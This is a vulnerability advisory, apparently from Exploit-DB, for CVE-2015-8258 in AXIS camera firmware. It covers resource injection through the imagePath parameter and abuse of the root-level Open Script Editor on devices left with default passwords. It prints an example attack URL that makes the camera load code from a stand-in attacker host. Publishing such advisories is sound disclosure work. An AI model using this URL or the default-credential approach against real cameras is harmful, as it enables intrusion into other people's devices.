Advisory Information
====================
- Title: ImagePath Resource Injection/Open script editor
- Vendor: AXIS Communications
- Research and Advisory: Orwelllabs
- Class: Improper Input Validation [CWE-20]
- CVE Name: CVE-2015-8258
- Affected Versions: Firmwares versions <lt 5.80.x
- IoT Attack Surface: Device Administrative Interface/Authentication/Autho
rization
- OWASP IoTTop10: I1, I2

Technical Details
=================
The variable "imagePath=" (that is prone to XSS in a large range of
products) also can be used to resource injection intents. If inserted a URL
in this variable will be made an GET request to this URL, so this an
interesting point to request malicious codes from the attacker machine, and
of course, the possibilities are vast (including hook the browser).

An attacker sends the following URL for the current Web user interface of
the camera:
http://{AXISVULNHOST}/view.shtml?imagepath=http://www.3vilh0
st.com/evilcode.html

This request will be processed normally and will return the status code 200
(OK):

---*---
Some legitimate resources can be very interesting to cybercriminals with
your hansowares/botnets/bitcoinminer/backdoors/malwares etc. In this case
there are some resources, like the "Open Script Editor". By this resource
the user can edit any file in the operation system with root privileges,
because everything (in the most part of IoT devices) runs with root
privileges, this is other dangerous point to keep in mind.

> Open Script Editor path: 'System Options' -> 'Advanced' -> 'Scripting'

Well, one can say that this feature is restricted to the administrator of
the camera, and this would be true if customers were forced  to change the
default password during setup phase with a strong password policy, since
change "pass" to "pass123" does not solve the problem. The aggravating
factor is that there are thousands of products available on the internet,
running with default credentials.

Vendor Information, Solutions and Workarounds
+++++++++++++++++++++++++++++++++++++++++++++
According to the manufacturer, the resource injection vulnerability was
fixed in firmware 5.60, but we identified that the problem still occurred
in 5.80.x versions of various product models. Check for updates on the
manufacturer's website.

About Open Script Editor,It was considered that in order to have access to
this feature, it is necessary to be authenticated as an admin, but if there
is no policy that forces the client to change the password during the
product setup (ease vs. security) and also requires a password complexity,
having an administrative credential to abuse the functionality is not
exactly an impediment (e.g: botnets that bring embedded in the code a
relation of default credentials for that type of device)

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
